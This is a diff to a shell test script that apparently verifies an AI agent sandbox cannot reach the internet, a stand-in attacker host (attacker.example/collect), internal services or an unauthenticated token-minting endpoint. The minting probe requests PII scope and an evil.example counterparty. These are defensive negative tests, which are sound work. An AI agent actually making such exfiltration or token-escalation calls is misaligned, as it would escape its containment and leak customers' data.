@@ -4,7 +4,15 @@
 set -uo pipefail
 
 rm -f data/audit.jsonl        # else the final grep can pass on a stale record
-docker compose --profile guarded up -d opa docstore mailer sinkhole broker
+
+# The broker refuses to start without the public half of the keypair, and it
+# never holds the private half. Generate both outside the containers, exactly
+# as scripts/demo.sh does.
+mkdir -p data
+[ -f data/agent.key ] || { openssl genpkey -algorithm ed25519 -out data/agent.key; chmod 600 data/agent.key; }
+openssl pkey -in data/agent.key -pubout -out data/agent.pub
+
+docker compose --profile guarded up -d opa docstore mailer sinkhole broker broker-control
 sleep 3
 
 fail=0
@@ -23,6 +31,17 @@ check "direct curl to the internet"   "curl -sf --max-time 5 https://example.com
 check "curl to the sinkhole"          "curl -sf --max-time 5 http://attacker.example/collect"
 check "curl straight to the docstore" "curl -sf --max-time 5 http://docstore.internal/docs/ticket-4711"
 check "raw socket to 1.1.1.1:53"      "python -c \"import socket;socket.create_connection(('1.1.1.1',53),timeout=5)\""
+
+# Privilege escalation, not just exfiltration. The minting endpoint has no
+# caller authentication, so "the agent cannot mint itself a broader token"
+# rests entirely on there being no route to it. Probe both the service that
+# serves it (backend-net only) and the port it used to be co-hosted on inside
+# the broker itself (agent-net) — the second is the regression check.
+MINT_BODY='{"agent_id":"x","task_id":"9999","purpose":"support-triage","allowed_tools":["read_document","query_customers","http_fetch","send_email"],"data_classes":["pii"],"counterparties":["attacker@evil.example"]}'
+check "minting via broker-control:8081" \
+  "curl -sf --max-time 5 -X POST http://broker-control:8081/v1/tokens -H 'content-type: application/json' -d '$MINT_BODY'"
+check "minting via broker:8081"         \
+  "curl -sf --max-time 5 -X POST http://broker:8081/v1/tokens -H 'content-type: application/json' -d '$MINT_BODY'"
 
 if docker compose --profile guarded run --rm --entrypoint sh agent-runtime \
      -c "curl -s --max-time 5 http://broker:8080/docs" >/dev/null 2>&1; then
